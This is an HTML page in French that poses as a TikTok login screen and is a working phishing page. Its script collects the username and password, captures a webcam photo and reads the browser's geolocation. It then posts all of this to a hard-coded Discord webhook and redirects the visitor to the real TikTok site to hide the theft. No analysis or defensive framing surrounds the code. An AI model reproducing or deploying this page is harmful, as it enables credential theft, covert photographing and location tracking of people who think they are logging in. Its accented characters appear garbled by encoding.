<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion TikTok</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 350px;
      text-align: center;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #fe2c55;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background-color: #e91b44;
    }
    #video, #canvas {
      width: 100%;
      max-width: 320px;
      margin: 10px 0;
      display: block;
    }
    #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Connecte-toi √† TikTok</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="E-mail ou nom d'utilisateur" required>
      <input type="password" id="password" placeholder="Mot de passe" required>
      <video id="video" autoplay></video>
      <canvas id="canvas"></canvas>
      <button type="button" id="snap">Prendre une photo</button>
      <button type="submit">Se connecter</button>
    </form>
  </div>
  <script>
  // Webcam setup
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const snap = document.getElementById('snap');
  let imageData = "";

  // D√©marre la webcam
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
      video.srcObject = stream;
      video.play();
    });
  }

  // Prendre une photo
  snap.addEventListener("click", function(e) {
    e.preventDefault();
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
    imageData = canvas.toDataURL('image/png');
    snap.textContent = "Photo prise ‚úî";
    canvas.style.display = "block";
    video.style.display = "none";
  });

  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";

    // Fonction pour envoyer au webhook
    function sendToDiscord(locationText) {
      let content = `üîî Nouvelle connexion re√ßue :\nüë§ Utilisateur : ${username}\nüîë Mot de passe : ${password}\n${locationText}`;
      // On envoie la photo en base64 dans le message (attention √† la limite de taille de Discord)
      if (imageData) {
        content += `\nüì∏ Photo (base64):\n${imageData}`;
      } else {
        content += `\nüì∏ Aucune photo prise`;
      }
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content })
      })
      .then(response => {
        window.location.href = "https://www.tiktok.com";
      })
      .catch(() => {
        window.location.href = "https://www.tiktok.com";
      });
    }

    // R√©cup√®re localisation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const locationText = `üåç Localisation :\nLatitude : ${lat}\nLongitude : ${lon}`;
        sendToDiscord(locationText);
      }, function(error) {
        sendToDiscord("üåç Localisation : non autoris√©e ou non disponible");
      });
    } else {
      sendToDiscord("üåç Localisation : non support√©e");
    }
  });
  </script>
</body>
</html>
